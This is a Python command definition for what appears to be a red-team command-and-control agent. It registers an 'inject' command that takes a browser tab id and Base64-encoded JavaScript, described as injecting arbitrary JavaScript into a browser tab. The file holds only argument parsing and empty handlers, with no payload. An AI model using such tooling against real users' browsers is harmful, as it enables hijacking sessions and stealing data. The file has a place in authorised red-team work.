from CommandBase import *
import json


class InjectArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "tabid": CommandParameter(name="tabid", type=ParameterType.Number),
            "javascript": CommandParameter(
                name="javascript",
                type=ParameterType.String,
                description="Base64 encoded javascript",
                required=False,
            ),
        }

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


class InjectCommand(CommandBase):
    cmd = "inject"
    needs_admin = False
    help_cmd = 'inject {"tabid":0,"javascript":"base64 encoded javascript"}'
    description = "Inject arbitrary javascript into a browser tab"
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = "@xorrior"
    argument_class = InjectArguments
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass
